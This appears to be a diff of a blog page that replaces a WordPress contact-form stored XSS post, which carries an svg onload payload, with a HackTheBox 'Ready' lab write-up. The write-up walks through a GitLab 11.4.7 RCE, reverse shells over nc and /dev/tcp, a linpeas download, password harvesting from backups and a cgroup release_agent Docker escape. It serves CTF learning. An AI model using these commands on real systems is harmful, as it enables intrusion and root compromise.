@@ -23,7 +23,7 @@
   <meta name="description" content="">
   <meta name="author" content="FunPhishing">
   <meta name="keywords" content="">
-  <title>WordPress Easy Contact Form 1.1.7 Cross Site Scripting - Fun Phishing</title>
+  <title>HackTheBox-Ready WriteUp - Fun Phishing</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -153,9 +153,9 @@
               <div class="full-bg-img">
                 <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
                   <div class="page-header text-center fade-in-up">
-                    <span class="h2 text1" id="subtitle" title="WordPress Easy Contact Form 1.1.7 Cross Site Scripting">
+                    <span class="h2 text1" id="subtitle" title="HackTheBox-Ready WriteUp">
                       
-                        WordPress Easy Contact Form 1.1.7 Cross Site Scripting
+                        HackTheBox-Ready WriteUp
                       
                     </span>
         
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-01-16 19:06" pubdate>
-        January 16, 2021 pm
+      <time datetime="2021-01-17 19:51" pubdate>
+        January 17, 2021 pm
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      127 字
+      258 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      2
+      5
        分钟
     </span>
   
@@ -218,26 +218,19 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">WordPress Easy Contact Form 1.1.7 Cross Site Scripting</h1>
+            <h1 style="display: none">HackTheBox-Ready WriteUp</h1>
             
             <div class="markdown-body">
-              <h4 id="WordPress-Easy-Contact-Form-1-1-7-Cross-Site-Scripting"><a href="#WordPress-Easy-Contact-Form-1-1-7-Cross-Site-Scripting" class="headerlink" title="WordPress Easy Contact Form 1.1.7 Cross Site Scripting"></a>WordPress Easy Contact Form 1.1.7 Cross Site Scripting</h4><p>WordPress Easy Contact Form plugin version 1.1.7 suffers from a persistent cross site scripting vulnerability.</p>
-<p>Steps:</p>
-<ol>
-<li><p>Install WordPress 5.6</p>
-</li>
-<li><p>Install and activate <em>Contact Form Plugin</em> plugin.</p>
-</li>
-<li><p>Go to * Contact Form Plugin *plugin section and click on the add new form button.</p>
-</li>
-<li><p>Fill all required details and click on the save button and capture the request in a proxy tool like burp suite.</p>
-</li>
-<li><p>Append the JavaScript payload in the “Email Header” field as mentioned below</p>
-<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">*&quot;&lt;sc&gt;&lt;svg/onload=alert(454)&gt;&quot;*<br></code></pre></div></td></tr></table></figure></li>
-<li><p>You will observe that the payload successfully got stored and reflected into the response and the malicious JavaScript payload got executed successfully and we are getting a pop-up.</p>
-</li>
-</ol>
-
+              <h4 id="HackTheBox-Ready-WriteUp"><a href="#HackTheBox-Ready-WriteUp" class="headerlink" title="HackTheBox-Ready WriteUp"></a>HackTheBox-Ready WriteUp</h4><h6 id="IP-10-10-10-220"><a href="#IP-10-10-10-220" class="headerlink" title="IP:10.10.10.220"></a>IP:10.10.10.220</h6><h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><p>port:22<br>SSH<br>port:5080<br><a target="_blank" rel="noopener" href="http://10.10.10.220:5080/users/sign_in">http://10.10.10.220:5080/users/sign_in</a> #GitLab Community Edition 11.4.7 (RCE)</p>
+<h6 id="Build-Exploit"><a href="#Build-Exploit" class="headerlink" title="Build Exploit :"></a>Build Exploit :</h6><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49334">https://www.exploit-db.com/exploits/49334</a></p>
+<p>#-P need change to other thing cuz the -p will be -P,i change it to -port<br>parser.add_argument(‘-port’, help=’reverse shell port’, required=True)<br>local_port = args.port # change it to port too<br>nc {local_ip} {local_port} -e /bin/bash #need change</p>
+<h6 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h6><p>nc -lvvp port<br>python3 gitlab11.4.7.py -u username -p password -g <a target="_blank" rel="noopener" href="http://10.10.10.220/">http://10.10.10.220</a> -l ip -port port<br>python3 -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
+<h6 id="User"><a href="#User" class="headerlink" title="User"></a>User</h6><p>cd /home/ #Found the username<br>/home/dude<br>#user<br>dude/user.txt </p>
+<h6 id="Enum-Root"><a href="#Enum-Root" class="headerlink" title="Enum Root"></a>Enum Root</h6><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">python3 -m http.server 8080<br>wget http://ip:port/linpeas.sh #run script and look like we in docker<br></code></pre></div></td></tr></table></figure>
+<p>need enum more things.</p>
+<h6 id="Enum-local"><a href="#Enum-local" class="headerlink" title="Enum local"></a>Enum local</h6><p>/opt/backup/* #Found<br>cat ./* | grep “passw”<br>gitlab_rails[‘smtp_password’] = “wW59U!ZKMbG9+<em>#h” #test for su users<br>wW59U!ZKMbG9+</em>#h #docker root passowd</p>
+<h6 id="docker-escape"><a href="#docker-escape" class="headerlink" title="docker escape"></a>docker escape</h6><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> In the container</span><br>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x<br>echo 1 &gt; /tmp/cgrp/x/notify_on_release<br>host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`<br>echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent<br><br><span class="hljs-meta">#</span><span class="bash">We use Reverse shell</span><br>echo &#x27;#!/bin/bash&#x27; &gt; /cmd<br>echo &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot; &gt;&gt; /cmd<br>chmod a+x /cmd<br><span class="hljs-meta">#</span><span class="bash">===================================</span><br>sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;<br><br>nc -lvvp 4444 #get root<br></code></pre></div></td></tr></table></figure>
             </div>
             <hr>
             <div>
@@ -246,7 +239,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/Exploit/">Exploit</a>
+                      <a class="hover-with-bg" href="/categories/WriteUp/">WriteUp</a>
                     
                   </div>
                 
@@ -254,7 +247,11 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Cross-Site-Scripting/">Cross Site Scripting</a>
+                      <a class="hover-with-bg" href="/tags/CVE-2018-19571/">CVE-2018-19571</a>
+                    
+                      <a class="hover-with-bg" href="/tags/CVE-2018-19585/">CVE-2018-19585</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Docker-Escape/">Docker Escape</a>
                     
                   </div>
                 
@@ -267,18 +264,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/17/HackTheBox-Ready/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">HackTheBox-Ready WriteUp</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/01/16/Nagios-XI-5-7-x-Remote-Code-Execution/">
-                        <span class="hidden-mobile">Nagios XI 5.7.x Remote Code Execution</span>
+                      <a href="/2021/01/16/WordPress-Easy-Contact-Form-1-1-7-Cross-Site-Scripting/">
+                        <span class="hidden-mobile">WordPress Easy Contact Form 1.1.7 Cross Site Scripting</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -304,7 +295,7 @@
           repo: 'chat',
           owner: 'FunPhishing',
           admin: ["FunPhishing"],
-          id: '4cc8c5b35bffae286bc0a1d5b7feb08e',
+          id: '1db0d285268ec09dbaf61a91e4ee30fe',
           language: 'zh-CN',
           labels: ["Gitalk"],
           perPage: 10,
